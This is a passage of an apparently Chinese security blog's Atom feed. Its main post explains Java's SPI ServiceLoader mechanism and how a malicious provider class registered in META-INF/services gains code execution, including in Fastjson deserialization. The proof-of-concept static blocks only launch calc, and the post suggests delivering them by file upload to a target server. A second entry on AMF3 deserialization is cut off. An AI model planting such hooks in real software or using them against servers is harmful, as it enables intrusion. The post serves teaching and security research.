<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mi1k7ea</title>
  
  <subtitle>Wiki</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mi1k7ea.com/"/>
  <updated>2019-12-08T14:20:44.777Z</updated>
  <id>https://www.mi1k7ea.com/</id>
  
  <author>
    <name>Mi1k7ea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>浅析Java SPI安全</title>
    <link href="https://www.mi1k7ea.com/2019/12/08/%E6%B5%85%E6%9E%90Java-SPI%E5%AE%89%E5%85%A8/"/>
    <id>https://www.mi1k7ea.com/2019/12/08/浅析Java-SPI安全/</id>
    <published>2019-12-08T02:03:57.000Z</published>
    <updated>2019-12-08T14:20:44.777Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="SPI简介及思想"><a href="#SPI简介及思想" class="headerlink" title="SPI简介及思想"></a>SPI简介及思想</h3><p>SPI全称Service Provider Interface，是Java提供的一套用来被第三方实现或者扩展的API，它可以用来启用框架扩展和替换组件。常见的SPI有JDBC、日志门面接口、Spring、SpringBoot相关starter组件、Dubbo、JNDI等。</p><p>Java SPI实际上是“基于接口的编程＋策略模式＋配置文件”组合实现的动态加载机制，在JDK中提供了工具类<code>java.util.ServiceLoader</code>来实现服务查找。</p><p>SPI的整体机制图如下：</p><p><img src="/2019/12/08/浅析Java-SPI安全/1.png" alt=""></p><blockquote><p>系统设计的各个抽象，往往有很多不同的实现方案，在面向的对象的设计里，一般推荐模块之间基于接口编程，模块之间不对实现类进行硬编码。一旦代码里涉及具体的实现类，就违反了可拔插的原则，如果需要替换一种实现，就需要修改代码。为了实现在模块装配的时候能不在程序里动态指明，这就需要一种服务发现机制。Java SPI就是提供这样的一个机制：为某个接口寻找服务实现的机制。有点类似IOC的思想，就是将装配的控制权移到程序之外，在模块化设计中这个机制尤其重要。所以SPI的核心思想就是解耦。</p><p>在Jdk 6里面引进的一个新的特性ServiceLoader，从官方的文档来说，它主要是用来装载一系列的Service Provider。而且ServiceLoader可以通过Service Provider的配置文件来装载指定的Service Provider。当服务的提供者，提供了服务接口的一种实现之后，我们只需要在jar包的META-INF/services/目录里同时创建一个以服务接口命名的文件。该文件里就是实现该服务接口的具体实现类。而当外部程序装配这个模块的时候，就能通过该jar包META-INF/services/里的配置文件找到具体的实现类名，并装载实例化，完成模块的注入。</p></blockquote><p>简单地说，SPI机制就是，服务端提供接口类和寻找服务的功能，客户端用户这边根据服务端提供的接口类来定义具体的实现类，然后服务端会在加载该实现类的时候去寻找该服务即META-INF/services/目录里的配置文件中指定的类。这就是SPI和传统的API的区别，API是服务端自己提供接口类并自己实现相应的类供客户端进行调用，而SPI则是提供接口类和服务寻找功能、具体的实现类由客户端实现并调用：</p><p><img src="/2019/12/08/浅析Java-SPI安全/10.png" alt=""></p><h3 id="SPI使用示例"><a href="#SPI使用示例" class="headerlink" title="SPI使用示例"></a>SPI使用示例</h3><p>SPI机制的实现，具体的实现类就是<code>java.util.ServiceLoader</code>这个类。其原理是根据传入的接口类，遍历<code>META-INF/services</code>目录下的以该类命名的文件中的所有类，并实例化返回。</p><p>SPI使用步骤：</p><ol><li>创建一个接口文件；</li><li>在resources目录下创建META-INF/services文件夹；</li><li>在services目录中创建文件，以接口全名命名该文件，称该文件为SPI配置文件；</li><li>创建接口实现类；</li><li>在SPI配置文件中填入接口实现类的全名；</li></ol><p>下面具体看下例子。</p><p>第一步，创建一个接口文件，Search.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Search</span> </span>&#123;</span><br><span class="line">    <span class="function">List&lt;String&gt; <span class="title">searchDoc</span><span class="params">(String keyword)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二步，在resources目录即src下创建META-INF/services文件夹：</p><p><img src="/2019/12/08/浅析Java-SPI安全/2.png" alt=""></p><p>第三步，在services目录中创建文件，以接口全名命名该文件：</p><p><img src="/2019/12/08/浅析Java-SPI安全/3.png" alt=""></p><p>第四步，创建接口实现类，这里分别创建FileSearch.java和DatabaseSearch.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// FileSearch.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileSearch</span> <span class="keyword">implements</span> <span class="title">Search</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">searchDoc</span><span class="params">(String keyword)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"文件搜索 "</span>+keyword);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DatabaseSearch.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DatabaseSearch</span> <span class="keyword">implements</span> <span class="title">Search</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">searchDoc</span><span class="params">(String keyword)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"数据搜索 "</span>+keyword);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第五步，在SPI配置文件中填入接口实现类的全名，这里先填FileSearch的：</p><p><img src="/2019/12/08/浅析Java-SPI安全/4.png" alt=""></p><p>最后，我们写一个测试程序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ServiceLoader&lt;Search&gt; s = ServiceLoader.load(Search.class);</span><br><span class="line">        Iterator&lt;Search&gt; iterator = s.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            Search search =  iterator.next();</span><br><span class="line">            search.searchDoc(<span class="string">"Java SPI Test"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件搜索 Java SPI Test</span><br></pre></td></tr></table></figure><p>如果SPI配置文件中的内容改为DatabaseSearch类的全名的话就输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数据搜索 Java SPI Test</span><br></pre></td></tr></table></figure><p>若两个实现类都写入了，则两者都会进行输出。</p><p>这样就明显看到，实现方（或服务端）提供了接口类，具体调用哪个实现类由调用方（或客户端）通过SPI机制来指定调用。</p><h2 id="0x02-SPI安全问题"><a href="#0x02-SPI安全问题" class="headerlink" title="0x02 SPI安全问题"></a>0x02 SPI安全问题</h2><p>根据SPI的思想，我们知道服务端提供的接口类是用户自己实现的，但如果攻击者根据接口类编写恶意的实现类，然后通过某种方式修改ClassPath中META-INF/services目录中的对应的SPI配置文件后，就会导致服务端在通过SPI机制调用用户自定义的恶意实现类时的任意代码执行。</p><h3 id="Sample"><a href="#Sample" class="headerlink" title="Sample"></a>Sample</h3><p>Output.java，服务端提供的接口类，设计用来输出的接口类，在com.mi1k7ea包中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Output</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">outPut</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java，服务端的通过SPI机制调用Output接口类的实现类的程序，在com.mi1k7ea包中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.mi1k7ea.Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.ServiceLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ServiceLoader&lt;Output&gt; s = ServiceLoader.load(Output.class);</span><br><span class="line">        Iterator&lt;Output&gt; iterator = s.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            Output output =  iterator.next();</span><br><span class="line">            output.outPut();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>正常使用场景</strong></p><p>OutputImpl类，实现Output接口类，是正常用户通过SPI机制根据Output接口类来定义的，重写outPut()函数实现输出，在com.user包中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.user;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mi1k7ea.Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OutputImpl</span> <span class="keyword">implements</span> <span class="title">Output</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">outPut</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"I am OutputImpl."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>META-INF/services/com.mi1k7ea.Output，服务端Output接口类的SPI配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.user.OutputImpl</span><br></pre></td></tr></table></figure><p>运行服务端的Test，正常执行用户自定义实现的类并输出内容：</p><p><img src="/2019/12/08/浅析Java-SPI安全/5.png" alt=""></p><p><strong>问题场景</strong></p><p>Evil类，同样是用户根据SPI自定义实现Output接口类，但该类中添加了静态代码块来执行恶意命令（当然也可以在重写的方法中写入恶意代码，但服务端程序的调用实现类的时候不一定会调用该方法，因此写静态代码块才会必然使之触发）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.user;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mi1k7ea.Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> <span class="keyword">implements</span> <span class="title">Output</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">outPut</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"This is Evil."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>META-INF/services/com.mi1k7ea.Output，服务端Output接口类的SPI配置文件添加或直接修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.user.Evil</span><br></pre></td></tr></table></figure><p>运行服务端程序Test，即可触发弹计算器：</p><p><img src="/2019/12/08/浅析Java-SPI安全/6.png" alt=""></p><h3 id="反序列化Gadget——ScriptEngineManager"><a href="#反序列化Gadget——ScriptEngineManager" class="headerlink" title="反序列化Gadget——ScriptEngineManager"></a>反序列化Gadget——ScriptEngineManager</h3><p>反序列化漏洞利用的其中一个Gadget——ScriptEngineManager，其利用原理就是Java的SPI机制。</p><p>具体的利用和调试分析可参考：<a href="https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E5%A4%8D%E7%8E%B0%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8EScriptEngineManager%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89">Java SnakeYaml反序列化漏洞</a></p><h3 id="Fastjson反序列化中的SPI"><a href="#Fastjson反序列化中的SPI" class="headerlink" title="Fastjson反序列化中的SPI"></a>Fastjson反序列化中的SPI</h3><p>Fastjson在反序列化之前，会先获取ObjectDeserializer即对应的对象反序列化解析器。</p><p><strong>ObjectDeserializer</strong>：先根据fieldType获取已缓存的解析器，如果没有则根据fieldClass获取已缓存的解析器，否则根据注解的JSONType获取解析器，否则通过当前线程加载器加载的AutowiredObjectDeserializer查找解析器，否则判断是否为几种常用泛型（比如Collection、Map等），最后通过createJavaBeanDeserializer来创建对应的解析器。</p><p>Fastjson在反序列化的时候支持通过Java的SPI机制扩展新的反序列化解析器，其中该解析器对应的接口类为com.alibaba.fastjson.parser.deserializer.AutowiredObjectDeserializer。</p><p>如果攻击者实现的该接口类的实现类存在恶意代码，且修改了SPI配置文件指向该恶意实现类，那么当服务端在进行Fastjson反序列化的过程中通过SPI机制调用的AutowiredObjectDeserializer接口类的实现类的时候就会导致恶意代码执行。</p><h4 id="Sample-1"><a href="#Sample-1" class="headerlink" title="Sample"></a>Sample</h4><p>环境用jar包是fastjson-1.2.25。</p><p>FJTest.java，实现AutowiredObjectDeserializer接口类，在静态代码块中添加恶意命令执行的操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.DefaultJSONParser;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.deserializer.AutowiredObjectDeserializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Type;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest</span> <span class="keyword">implements</span> <span class="title">AutowiredObjectDeserializer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Set&lt;Type&gt; <span class="title">getAutowiredFor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser defaultJSONParser, Type type, Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getFastMatchToken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在META-INF/services目录中新建名为com.alibaba.fastjson.parser.deserializer.AutowiredObjectDeserializer的文件，其中内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.evil.FJTest</span><br></pre></td></tr></table></figure><p>当服务端存在Fastjson反序列化操作时，即可通过SPI触发恶意代码执行。这里假设服务端存在如下Fastjson反序列化操作，即反序列化得到Student类对象：</p><p>Student类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java，服务端进行Fastjson反序列化的程序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">"&#123;\"@type\":\"Student\",\"age\":6,\"name\":\"Mi1k7ea\"&#125;"</span>;</span><br><span class="line">        Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行Test程序进行正常的反序列化操作，直接触发弹计算器：</p><p><img src="/2019/12/08/浅析Java-SPI安全/7.png" alt=""></p><p>当然，我们本地示例是直接在ClassPath上进行创建META-INF/services目录的相关操作的，这种情景针对于目标服务端环境中，比如Tomcat容器中存在该META-INF/services目录，我们可以通过文件上传漏洞将恶意的SPI配置文件传至该目录中，再上传一个恶意的class导致恶意代码执行；除此之外，还有一种更常见的情景就是，通过jar包的形式来实现，但在实际场景的攻击利用中较为困难，因为目标服务端一般在运行Java Web相关环境时就已经指定好哪些jar加载到Java内存中解析执行，即使我们后面上传也没用。</p><h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>直接在恶意代码FJTest中的静态代码块<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>上打断点开始调试。</p><p>运行直接看到如下函数调用栈：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;clinit&gt;:12, FJTest (com.evil)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:442, Class (java.lang)</span><br><span class="line">load:49, ServiceLoader (com.alibaba.fastjson.util)</span><br><span class="line">getDeserializer:475, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class="line">getDeserializer:364, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:636, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:339, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:243, JSON (com.alibaba.fastjson)</span><br><span class="line">main:11, Test</span><br></pre></td></tr></table></figure><p>可以看到，在ParserConfig.getDeserializer()函数调用中，会循环调用ServiceLoader.load()函数即通过SPI机制来到META-INF/services目录中加载AutowiredObjectDeserializer接口类的实现类：</p><p><img src="/2019/12/08/浅析Java-SPI安全/8.png" alt=""></p><p>跟进去ServiceLoader.load()函数，先获取接口类名、拼接出SPI配置文件的路径，然后调用getResources()从SPI配置文件中获取指定的实现类的URL地址，再循环将实现类都加载进来，加载后会调用newInstance()函数来新建该实现类对象实例：</p><p><img src="/2019/12/08/浅析Java-SPI安全/9.png" alt=""></p><p>再往下就是新建类实例的过程中执行了该恶意类的静态代码块的过程从而导致恶意代码执行了。</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://zhuanlan.zhihu.com/p/28909673" target="_blank" rel="noopener">Java SPI思想梳理</a></p><p><a href="https://juejin.im/post/5b9b1c115188255c5e66d18c" target="_blank" rel="noopener">理解的Java中SPI机制</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java AMF3反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2019/12/07/Java-AMF3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2019/12/07/Java-AMF3反序列化漏洞/</id>
    <published>2019-12-07T03:36:41.000Z</published>
    <updated>2019-12-07T14:56:27.613Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><p>AMF是Action Message Format的简称，是一种二进制序列化格式，主要用于数据交互和远程过程调用。</p><p>一个Action Message由头部（header）和主体（body）所组成。</p><p>AMF3（Action Message Format version 3）是AMF的第三版，同样是一种二进制信息编码格式，也是Flash应用在后台交互时主要使用的一种数据格式。与JSON类似，它支持不同的数据类型。考虑到向后兼容性，AMF3实际上算是AMF的一种扩展实现，并且引入了新的对象类型。</p><p>AMF3对象的新功能可以归结为两种新增加的特性，即Dynamic和Externalizable，这两种新特性描述了对象是如何进行序列化操作的：</p><ul><li>Dynamic：一个声明了动态特性的类实例，公共变量成员可以在程序运行时动态添加/删除到实例中；</li><li>Externalizable：实现flash.utils.Externalizable并完全控制器成员序列化的类实例；</li></ul><p><strong>Dynamic特性</strong></p><blockquote><p>我们可以拿Dynamic特性与JavaBeans的功能进行对比：它允许我们通过类名及属性来创建一个对象。实际上，很多JavaBeans实体目前已经实现了这种技术，例如java.beans.Introspector、Flamingo、Flex BlazeDS和WebORB等等。</p><p>但需要注意的是，这种功能将会导致一种可利用的漏洞产生。实际上，<a href="http://wouter.coekaerts.be/2011/amf-arbitrary-code-execution" target="_blank" rel="noopener">Wouter Coekaerts早在2011年就已经将这种存在于AMF实现中的漏洞曝光了</a>，并且还在2016年发布了相应漏洞的利用代码及PoC。</p></blockquote><p><strong>Externalizable特性</strong></p><blockquote><p>我们可以拿Externalizable特性赖于Java的java.io.Externalizable接口进行对比。实际上，很多厂商早就已经将flash.utils.IExternalizable接口的规范进行了调整，其实它与Java的java.io.Externalizable区别不大，这种特性将允许我们可以高效地对实现了java.io.Externalizable接口的类进行重构。</p><p>java.io.Externalizable接口定义了两个方法：即readExternal（java.io.ObjectInput）和writeExternal（java.io.ObjectInput），而这两个方法将允许java类完全控制序列化以及反序列化操作。这也就意味着，在程序的运行过程中不存在默认的序列化／反序列化行为以及有效性检测。因此，相对于java.io.Serializable来说，我们使用java.io.Externalizable来实现序列化／反序列化则更加的简单和高效。</p></blockquote><h2 id="0x02-使用AMF3序列化和反序列化"><a href="#0x02-使用AMF3序列化和反序列化" class="headerlink" title="0x02 使用AMF3序列化和反序列化"></a>0x02 使用AMF3序列化和反序列化</h2><p>本地测试用的jar：flex-messaging-core-4.7.2，flex-messaging-common-4.7.2。</p><p>Person类，注意该类需要实现Serializable接口类才能实现序列化和反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span 